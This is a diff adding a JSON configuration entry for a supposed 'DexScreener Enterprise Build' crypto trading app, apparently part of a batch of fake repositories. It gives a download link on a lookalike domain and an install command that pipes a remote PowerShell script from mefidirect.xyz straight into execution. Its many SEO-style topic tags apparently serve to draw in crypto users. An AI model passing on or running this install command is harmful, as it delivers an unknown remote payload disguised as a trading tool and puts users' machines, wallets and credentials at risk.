@@ -1,0 +1,27 @@
+{
+  "repo": "dexscreener-enterprise-build",
+  "product": "DexScreener Enterprise Build",
+  "kind": "trading",
+  "install_type": "download",
+  "download_url": "https://dexscreener.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "trading",
+  "topics": [
+    "dexscreener-pc-edition",
+    "dexscreener-faq",
+    "setup-checklist",
+    "dexscreener-desktop",
+    "risk-metrics",
+    "support-docs",
+    "crypto-dashboard",
+    "configuration",
+    "dexscreener-desktop-app",
+    "dexscreener-setup-guide-2026",
+    "dexscreener-latest-build",
+    "order-tools",
+    "post-install"
+  ]
+}
